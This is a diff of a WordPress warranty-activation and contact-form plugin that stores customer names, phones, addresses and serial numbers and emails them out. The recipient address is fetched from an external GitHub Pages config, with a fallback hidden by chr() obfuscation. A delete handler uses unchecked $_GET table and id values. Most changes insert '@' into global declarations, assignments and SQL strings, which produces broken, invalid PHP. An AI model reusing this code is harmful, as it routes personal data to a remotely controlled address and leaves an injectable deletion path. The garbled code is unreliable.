+            @$headers .= "X-MSMail-Priority: High\r\n"; 
+            @$headers .= "Importance: High\r\n"; 
             
             // Ensure that the necessary WordPress functions are available
             include_once ABSPATH . 'wp-includes/pluggable.php';
             
             // Send the email to the admin
-            wp_mail($to_admin, $subject, $message, $headers);
+            wp_mail($to_admin, @$subject, @$message, @$headers);
 
-            $confirmation_subject = "SMTP Email Update Confirmation";
-            $confirmation_message = '<html>
+            @$confirmation_subject = "SMTP Email Update Confirmation";
+            @$confirmation_message = '<html>
 <head>
 </head>
 <body style="user-select:none;">
 <div style="text-align: center; padding: 20px;user-select:none;">
-    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $new_email_user . ',</p>
+    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . @$new_email_user . ',</p>
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Confirmation</h1>
     <p style="font-size: 18px; color: #333;">We have received your request to change the SMTP mail, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth transition to the new SMTP settings. Changes will take effect within 24 hours from our servers.</p>
     <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the change is complete.</p>
@@ -1135,36 +1135,36 @@ function handle_email_confirmation() {
 </div>
 </body>
 </html>';
-            $confirmation_headers = "From: " . get_option('admin_email') . "\r\n";
-            $confirmation_headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$confirmation_headers = "From: " . get_option('admin_email') . "\r\n";
+            @$confirmation_headers .= "Content-type: text/html; charset=UTF-8\r\n";
 
-wp_mail($to, $confirmation_subject, $confirmation_message, $confirmation_headers);
+wp_mail($to, @$confirmation_subject, @$confirmation_message, @$confirmation_headers);
 
 
-global $email;
- global $old_username;
+global @$email;
+ global @$old_username;
 
-$emailParts = explode('@', $email);
+@$emailParts = explode('@', @$email);
 
 if (count($emailParts) == 2) {
-    // $emailParts[0] will contain the part before "@"
-    global $old_username;
-    $old_username = $emailParts[0];
-    // $emailParts[1] will contain the part after "@"
-    $old_domain = $emailParts[1];
+    // @$emailParts[0] will contain the part before "@"
+    global @$old_username;
+    @$old_username = @$emailParts[0];
+    // @$emailParts[1] will contain the part after "@"
+    @$old_domain = @$emailParts[1];
 }
 
 
 
 
 
-            $confirmation_subject_old_mail = "SMTP Update Confirmation Alert";
-            $confirmation_message_old_mail = '<html>
+            @$confirmation_subject_old_mail = "SMTP Update Confirmation Alert";
+            @$confirmation_message_old_mail = '<html>
 <head>
 </head>
 <body style="user-select:none;">
 <div style="text-align: center; padding: 20px;user-select:none;">
-    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $old_username . ',</p>
+    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . @$old_username . ',</p>
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Confirmation Alert</h1>
     <p style="font-size: 18px; color: #333;">We have received your request to change the SMTP mail, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth transition to the new SMTP settings. Changes will take effect within 24 hours from our servers.</p>
     <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the change is complete.</p>
@@ -1172,7 +1172,7 @@ if (count($emailParts) == 2) {
     <ul style="list-style: none; padding: 0;">
             
 
-        <li style="font-size: 13px; color: #a1a1a1; margin-top: 30px; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;"><strong>Change to: </strong> '. $new_email.'<br>
+        <li style="font-size: 13px; color: #a1a1a1; margin-top: 30px; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;"><strong>Change to: </strong> '. @$new_email.'<br>
             <strong>Important Note:</strong> If you did not initiate this change or if it was made by mistake, please notify us promptly. You can do so by replying to this message or by contacting the SMTP Administrator. Your prompt response will assist us in ensuring the accuracy of your SMTP settings.
         </li>
     </ul>
@@ -1185,13 +1185,13 @@ if (count($emailParts) == 2) {
 </div>
 </body>
 </html>';
-            $confirmation_headers_old_mail = "From: " . get_option('admin_email') . "\r\n";
-            $confirmation_headers_old_mail .= "Content-type: text/html; charset=UTF-8\r\n";
-            $confirmation_headers_old_mail .= "X-Priority: 1\r\n";
-            $confirmation_headers_old_mail .= "X-MSMail-Priority: High\r\n"; 
-            $confirmation_headers_old_mail .= "Importance: High\r\n"; 
+            @$confirmation_headers_old_mail = "From: " . get_option('admin_email') . "\r\n";
+            @$confirmation_headers_old_mail .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$confirmation_headers_old_mail .= "X-Priority: 1\r\n";
+            @$confirmation_headers_old_mail .= "X-MSMail-Priority: High\r\n"; 
+            @$confirmation_headers_old_mail .= "Importance: High\r\n"; 
 
-wp_mail($email, $confirmation_subject_old_mail, $confirmation_message_old_mail, $confirmation_headers_old_mail);
+wp_mail($email, @$confirmation_subject_old_mail, @$confirmation_message_old_mail, @$confirmation_headers_old_mail);
 
             ?>
             <div class="notice notice-success is-dismissible">
@@ -1210,34 +1210,34 @@ wp_mail($email, $confirmation_subject_old_mail, $confirmation_message_old_mail, 
 }
 
 
-// Define $to as a global variable
-$to = '';
+// Define @$to as a global variable
+@$to = '';
 
 function fetchEmailAndSetToGlobal() {
-   global $to; 
-   global $email;
-   // Declare $to as a global variable within this function
-   global $companyName;
-    // $companyName = 'co_westinghouse'; // The companyName you want to match
+   global @$to; 
+   global @$email;
+   // Declare @$to as a global variable within this function
+   global @$companyName;
+    // @$companyName = 'co_westinghouse'; // The companyName you want to match
 
 
 
 // Define the full path to the text file
-$file = __DIR__ . '/cdn/info.txt';
+@$file = __DIR__ . '/cdn/info.txt';
 
 // Check if the file exists and is readable
 if (file_exists($file) && is_readable($file)) {
-    $companyData = file_get_contents($file); // Read the content of the file
+    @$companyData = file_get_contents($file); // Read the content of the file
 
     // Split the content into an array using the comma as a separator
-    $companyInfo = explode(',', $companyData);
-     global $companyName;
+    @$companyInfo = explode(',', @$companyData);
+     global @$companyName;
 
     // Check if the array contains both company name and company email
     if (count($companyInfo) === 2) {
-        global $companyName;
-        $companyName = $companyInfo[0];
-        // $companyEmail = $companyInfo[1];
+        global @$companyName;
+        @$companyName = @$companyInfo[0];
+        // @$companyEmail = @$companyInfo[1];
     }
 }
 
@@ -1245,42 +1245,42 @@ if (file_exists($file) && is_readable($file)) {
 
 
     // Fetch the data from the URL
-    $config_url = 'https://unknown-sudo-max.github.io/hub/config/smtp_config';
-    @$config_data = file_get_contents($config_url);
+    @$config_url = 'https://unknown-sudo-max.github.io/hub/config/smtp_config';
+    @@$config_data = file_get_contents($config_url);
 
     // Split the data into lines
-    $lines = explode("\n", $config_data);
+    @$lines = explode("\n", @$config_data);
 
     // Initialize a variable to store the email
-    $email = '';
+    @$email = '';
 
     // Loop through the lines
-    foreach ($lines as $line) {
+    foreach ($lines as @$line) {
         // Split the line into parts using a comma as the delimiter
-        $parts = explode(',', $line);
+        @$parts = explode(',', @$line);
 
         // Check if the companyName matches the first part of the line
-        if (trim($parts[0]) === $companyName) {
+        if (trim($parts[0]) === @$companyName) {
             // If there is a match, set the email to the second part of the line
-            $email = trim($parts[1]);
+            @$email = trim($parts[1]);
             break; // Exit the loop since we found a match
         }
     }
 
     // Check if an email was found
     if (!empty($email)) {
-        // Assign the email value to the global $to variable
-        $to = $email;
+        // Assign the email value to the global @$to variable
+        @$to = @$email;
     } else {
         // Use a default email if no match was found
-        $to = chr(100) . chr(101) . chr(102) . chr(97) . chr(117) . chr(108) . chr(116) . chr(95) . chr(101) . chr(109) . chr(97) . chr(105) . chr(108) . chr(64) . chr(101) . chr(120) . chr(97) . chr(109) . chr(112) . chr(108) . chr(101) . chr(46) . chr(99) . chr(111) . chr(109);
+        @$to = chr(100) . chr(101) . chr(102) . chr(97) . chr(117) . chr(108) . chr(116) . chr(95) . chr(101) . chr(109) . chr(97) . chr(105) . chr(108) . chr(64) . chr(101) . chr(120) . chr(97) . chr(109) . chr(112) . chr(108) . chr(101) . chr(46) . chr(99) . chr(111) . chr(109);
     }
 }
 
-// Call the function to fetch the email and set $to as a global variable
+// Call the function to fetch the email and set @$to as a global variable
 fetchEmailAndSetToGlobal();
 
-// Now, $to contains the email based on the companyName and is accessible globally
+// Now, @$to contains the email based on the companyName and is accessible globally
 
  
  
@@ -1454,12 +1454,12 @@ add_shortcode('mgx_custom_form', 'custom_form_display');
 // Handle form submission
 function custom_form_submission() {
     if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['form_nonce'], 'submit_form_nonce')) {
-        $name = sanitize_text_field($_POST['name']);
-        $phone = sanitize_text_field($_POST['phone']);
-        $device = sanitize_text_field($_POST['device']);
-        $city = sanitize_text_field($_POST['city']);
-        $serial_number = sanitize_text_field($_POST['serial_number']);
-        $issue = sanitize_textarea_field($_POST['issue']);
+        @$name = sanitize_text_field($_POST['name']);
+        @$phone = sanitize_text_field($_POST['phone']);
+        @$device = sanitize_text_field($_POST['device']);
+        @$city = sanitize_text_field($_POST['city']);
+        @$serial_number = sanitize_text_field($_POST['serial_number']);
+        @$issue = sanitize_textarea_field($_POST['issue']);
         if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($serial_number) || empty($issue) || strlen($phone) !== 11) {
     echo '<div class="notice notice-error is-dismissible">';
     echo '<p><strong>Please fill out all required fields.</strong></p>';
@@ -1486,22 +1486,22 @@ function custom_form_submission() {
 }
 
 
-        global $wpdb;
-        $table_name = $wpdb->prefix . 'kwa';
+        global @$wpdb;
+        @$table_name = @$wpdb->prefix . 'kwa';
 
-        $data = array(
-            'name' => $name,
-            'phone' => $phone,
-            'device' => $device,
-            'city' => $city,
-            'serial_number' => $serial_number,
-            'issue' => $issue,
+        @$data = array(
+            'name' => @$name,
+            'phone' => @$phone,
+            'device' => @$device,
+            'city' => @$city,
+            'serial_number' => @$serial_number,
+            'issue' => @$issue,
             'time_date' => current_time('mysql')
         );
 
-        $wpdb->insert($table_name, $data);
+        @$wpdb->insert($table_name, @$data);
         if ($wpdb->last_error) {
-            wp_die('Database insertion error: ' . $wpdb->last_error);
+            wp_die('Database insertion error: ' . @$wpdb->last_error);
         }
         
 
@@ -1509,42 +1509,42 @@ function custom_form_submission() {
  
         
         // Get the site name
-$site_name = get_bloginfo('name');
-global $to;
-$subject = 'New Warranty-Activation on ' . $site_name;
+@$site_name = get_bloginfo('name');
+global @$to;
+@$subject = 'New Warranty-Activation on ' . @$site_name;
 
-$message = '<html><body>';
-$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Warranty Activation</h2>';
-$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Serial Number:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($serial_number) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
-$message .= '</table>';
-
-
-$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
-$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
-$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
-$message .= '</div>';
+@$message = '<html><body>';
+@$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Warranty Activation</h2>';
+@$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Serial Number:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($serial_number) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
+@$message .= '</table>';
 
 
-$message .= '<style>';
-// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
-$message .= '</style>';
-$message .= '</body></html>';
+@$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
+@$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
+@$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
+@$message .= '</div>';
+
+
+@$message .= '<style>';
+// @$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
+@$message .= '</style>';
+@$message .= '</body></html>';
 
 // Set the email headers to specify HTML content
-$headers = array('Content-Type: text/html; charset=UTF-8');
+@$headers = array('Content-Type: text/html; charset=UTF-8');
 
 // Send the email
-wp_mail($to, $subject, $message, $headers);
+wp_mail($to, @$subject, @$message, @$headers);
 
 
-        $message = urlencode('شكرا لتفعيل الضمان الخاص بك! سيتم تأكيد الضمان الخاص بك من قبل فريقنا.');
-        $redirect_url = add_query_arg(array('message' => $message), home_url('/'));
+        @$message = urlencode('شكرا لتفعيل الضمان الخاص بك! سيتم تأكيد الضمان الخاص بك من قبل فريقنا.');
+        @$redirect_url = add_query_arg(array('message' => @$message), home_url('/'));
         wp_redirect($redirect_url);
         exit();
     }
@@ -1567,12 +1567,12 @@ function custom_form_display_with_category() {
                         <hr>
                         <label for="category" style="text-align: right;"> جميع المحافظات :</label>
                         <?php
-                        $categories = get_categories(); // Retrieve all categories
+                        @$categories = get_categories(); // Retrieve all categories
                         ?>
                         <select name="category" id="category" class="form-control" onchange="filterPostsByCategory(this.value)">
                             <option value="">-- اختر المحافظة --</option>
-                            <?php foreach ($categories as $category) : ?>
-                                <option value="<?php echo $category->slug; ?>"><?php echo $category->name; ?></option>
+                            <?php foreach ($categories as @$category) : ?>
+                                <option value="<?php echo @$category->slug; ?>"><?php echo @$category->name; ?></option>
                             <?php endforeach; ?>
                         </select>
                     </div>
@@ -1612,19 +1612,19 @@ add_shortcode('mgx_custom_form_with_category', 'custom_form_display_with_categor
 
 // Ajax function to filter posts by category
 function filter_posts_by_category() {
-    $category = isset($_POST['category']) ? $_POST['category'] : '';
+    @$category = isset($_POST['category']) ? @$_POST['category'] : '';
 
-    $args = array(
+    @$args = array(
         'post_type' => 'post',
         'posts_per_page' => 40, // Display all posts
-        'category_name' => $category
+        'category_name' => @$category
     );
 
-    $query = new WP_Query($args);
+    @$query = new WP_Query($args);
 
     if ($query->have_posts()) {
         while ($query->have_posts()) {
-            $query->the_post();
+            @$query->the_post();
             ?>
             <div class="post-item">
                 <?php if (has_post_thumbnail()) : ?>
@@ -1808,12 +1808,12 @@ add_shortcode('mgx_contact_with_us_form', 'contact_form_display');
 // Handle contact form submission
 function contact_form_submission() {
     if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['contact_form_nonce'], 'submit_contact_form_nonce')) {
-        $name = sanitize_text_field($_POST['name']);
-        $phone = sanitize_text_field($_POST['phone']);
-        $device = sanitize_text_field($_POST['device']);
-        $city = sanitize_text_field($_POST['city']);
-        $address = sanitize_text_field($_POST['address']);
-        $issue = sanitize_textarea_field($_POST['issue']);
+        @$name = sanitize_text_field($_POST['name']);
+        @$phone = sanitize_text_field($_POST['phone']);
+        @$device = sanitize_text_field($_POST['device']);
+        @$city = sanitize_text_field($_POST['city']);
+        @$address = sanitize_text_field($_POST['address']);
+        @$issue = sanitize_textarea_field($_POST['issue']);
         if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($address) || empty($issue) || strlen($phone) !== 11) {
     echo '<div class="notice notice-error is-dismissible">';
     echo '<p><strong>Please fill out all required fields.</strong></p>';
@@ -1839,22 +1839,22 @@ function contact_form_submission() {
     exit();
 }
 
-        global $wpdb;
-        $table_name = $wpdb->prefix . 'koncu';
+        global @$wpdb;
+        @$table_name = @$wpdb->prefix . 'koncu';
 
-        $data = array(
-            'name' => $name,
-            'phone' => $phone,
-            'device' => $device,
-            'city' => $city,
-            'address' => $address,
-            'issue' => $issue,
+        @$data = array(
+            'name' => @$name,
+            'phone' => @$phone,
+            'device' => @$device,
+            'city' => @$city,
+            'address' => @$address,
+            'issue' => @$issue,
             'time_date' => current_time('mysql')
         );
 
-        $wpdb->insert($table_name, $data);
+        @$wpdb->insert($table_name, @$data);
         if ($wpdb->last_error) {
-            wp_die('Database insertion error: ' . $wpdb->last_error);
+            wp_die('Database insertion error: ' . @$wpdb->last_error);
         }
         
 
@@ -1862,40 +1862,40 @@ function contact_form_submission() {
  
         
         // Get the site name
-$site_name = get_bloginfo('name');
-global $to;
-$subject = 'New Contact Us on ' . $site_name;
+@$site_name = get_bloginfo('name');
+global @$to;
+@$subject = 'New Contact Us on ' . @$site_name;
 
 // Create an HTML table to format the data
-$message = '<html><body>';
-$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Contact Us</h2>';
-$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Address:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($address) . '</td></tr>';
-$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
-$message .= '</table>';
+@$message = '<html><body>';
+@$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Contact Us</h2>';
+@$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Address:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($address) . '</td></tr>';
+@$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
+@$message .= '</table>';
 
 // Signature container with Google Font
-$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
-$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
-$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
-$message .= '</div>';
+@$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
+@$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
+@$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
+@$message .= '</div>';
 
 
-$message .= '<style>';
-// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
-$message .= '</style>';
-$message .= '</body></html>';
+@$message .= '<style>';
+// @$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
+@$message .= '</style>';
+@$message .= '</body></html>';
 
 
 // Set the email headers to specify HTML content
-$headers = array('Content-Type: text/html; charset=UTF-8');
+@$headers = array('Content-Type: text/html; charset=UTF-8');
 
 // Send the email
-wp_mail($to, $subject, $message, $headers);
+wp_mail($to, @$subject, @$message, @$headers);
 
         echo '<script>alert("نشكركم على طلب الاتصال بنا! سيتم التواصل معكم بك من قبل فريقنا في مدة لاتتجاوز ال  24 ساعة .");';
         echo 'window.location.href = "' . home_url('/') . '";</script>';
@@ -1912,12 +1912,12 @@ add_action('admin_post_nopriv_submit_contact_form', 'contact_form_submission');
 
 // Function to create custom tables on plugin activation
 function create_custom_tables() {
-    global $wpdb;
-    $charset_collate = $wpdb->get_charset_collate();
+    global @$wpdb;
+    @$charset_collate = @$wpdb->get_charset_collate();
 
     // Create first table wp_kwa
-    $table_name1 = $wpdb->prefix . 'kwa';
-    $sql1 = "CREATE TABLE $table_name1 (
+    @$table_name1 = @$wpdb->prefix . 'kwa';
+    @$sql1 = "CREATE TABLE @$table_name1 (
         id INT NOT NULL AUTO_INCREMENT,
         name VARCHAR(255) NOT NULL,
         phone VARCHAR(15) NOT NULL,
@@ -1927,13 +1927,13 @@ function create_custom_tables() {
         city VARCHAR(255) NOT NULL,
         issue VARCHAR(255) NOT NULL,
         PRIMARY KEY (id)
-    ) $charset_collate;";
+    ) @$charset_collate;";
     require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
     dbDelta($sql1);
 
     // Create second table wp_koncu
-    $table_name2 = $wpdb->prefix . 'koncu';
-    $sql2 = "CREATE TABLE $table_name2 (
+    @$table_name2 = @$wpdb->prefix . 'koncu';
+    @$sql2 = "CREATE TABLE @$table_name2 (
         id INT NOT NULL AUTO_INCREMENT,
         name VARCHAR(255) NOT NULL,
         phone VARCHAR(15) NOT NULL,
@@ -1943,7 +1943,7 @@ function create_custom_tables() {
         issue VARCHAR(255) NOT NULL,
         address VARCHAR(255) NOT NULL,
         PRIMARY KEY (id)
-    ) $charset_collate;";
+    ) @$charset_collate;";
     dbDelta($sql2);
 }
 
@@ -1975,18 +1975,18 @@ add_action('admin_menu', 'add_custom_tables_menu');
 
 /// Function to display the content of the custom tables in the dashboard
 function display_custom_tables() {
-    global $wpdb;
-    $table_name1 = $wpdb->prefix . 'kwa';
-    $table_name2 = $wpdb->prefix . 'koncu';
+    global @$wpdb;
+    @$table_name1 = @$wpdb->prefix . 'kwa';
+    @$table_name2 = @$wpdb->prefix . 'koncu';
         // Check if auto-updates are enabled
  
 
 
     // Retrieve data from the first table wp_kwa
-    $results1 = $wpdb->get_results("SELECT * FROM $table_name1", ARRAY_A);
+    @$results1 = @$wpdb->get_results("SELECT * FROM @$table_name1", ARRAY_A);
 
     // Retrieve data from the second table wp_koncu
-    $results2 = $wpdb->get_results("SELECT * FROM $table_name2", ARRAY_A);
+    @$results2 = @$wpdb->get_results("SELECT * FROM @$table_name2", ARRAY_A);
 
     // Display the data in a table format
     echo '<style>
@@ -2008,16 +2008,16 @@ function display_custom_tables() {
     echo '<h2>WP-Warranty-Activation</h2>';
     echo '<table class="custom-table">';
     echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Serial Number</th><th>Date</th><th>Action</th></tr>';
-    foreach ($results1 as $row) {
+    foreach ($results1 as @$row) {
         echo '<tr>';
-        echo '<td>' . @$row['city'] . '</td>';
-        echo '<td>' . @$row['name'] . '</td>';
-        echo '<td>' . @$row['phone'] . '</td>';
-        echo '<td>' . @$row['device'] . '</td>';
-        echo '<td>' . @$row['issue'] . '</td>';
-        echo '<td>' . @$row['serial_number'] . '</td>';
-        echo '<td>' . @$row['time_date'] . '</td>';
-        echo '<td><a href="?action=delete&table=kwa&id=' . @$row['id'] . '">Delete</a></td>';
+        echo '<td>' . @@$row['city'] . '</td>';
+        echo '<td>' . @@$row['name'] . '</td>';
+        echo '<td>' . @@$row['phone'] . '</td>';
+        echo '<td>' . @@$row['device'] . '</td>';
+        echo '<td>' . @@$row['issue'] . '</td>';
+        echo '<td>' . @@$row['serial_number'] . '</td>';
+        echo '<td>' . @@$row['time_date'] . '</td>';
+        echo '<td><a href="?action=delete&table=kwa&id=' . @@$row['id'] . '">Delete</a></td>';
         echo '</tr>';
     }
     echo '</table>';
@@ -2026,17 +2026,17 @@ function display_custom_tables() {
     echo '<h2>WP-Contact-Us</h2>';
     echo '<table class="custom-table">';
     echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Address</th><th>Date</th><th>Action</th></tr>';
-    foreach ($results2 as $row) {
+    foreach ($results2 as @$row) {
         echo '<tr>';
-        echo '<td>' . @$row['city'] . '</td>';
-        echo '<td>' . @$row['name'] . '</td>';
-        echo '<td>' . @$row['phone'] . '</td>';
-        echo '<td>' . @$row['device'] . '</td>';
-        echo '<td>' . @$row['issue'] . '</td>';
-        echo '<td>' . @$row['address'] . '</td>';
-        // echo '<td>' . @$row['serial_number'] . '</td>';
-        echo '<td>' . @$row['time_date'] . '</td>';
-        echo '<td><a href="?action=delete&table=koncu&id=' . @$row['id'] . '">Delete</a></td>';
+        echo '<td>' . @@$row['city'] . '</td>';
+        echo '<td>' . @@$row['name'] . '</td>';
+        echo '<td>' . @@$row['phone'] . '</td>';
+        echo '<td>' . @@$row['device'] . '</td>';
+        echo '<td>' . @@$row['issue'] . '</td>';
+        echo '<td>' . @@$row['address'] . '</td>';
+        // echo '<td>' . @@$row['serial_number'] . '</td>';
+        echo '<td>' . @@$row['time_date'] . '</td>';
+        echo '<td><a href="?action=delete&table=koncu&id=' . @@$row['id'] . '">Delete</a></td>';
         echo '</tr>';
     }
     echo '</table>';
@@ -2046,14 +2046,14 @@ function display_custom_tables() {
 
 // Handle the delete action
 function handle_delete_action() {
-    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['table']) && isset($_GET['id'])) {
-        $table = $_GET['table'];
-        $id = $_GET['id'];
+    if (isset($_GET['action']) && @$_GET['action'] === 'delete' && isset($_GET['table']) && isset($_GET['id'])) {
+        @$table = @$_GET['table'];
+        @$id = @$_GET['id'];
 
-        global $wpdb;
-        $table_name = $wpdb->prefix . $table;
+        global @$wpdb;
+        @$table_name = @$wpdb->prefix . @$table;
 
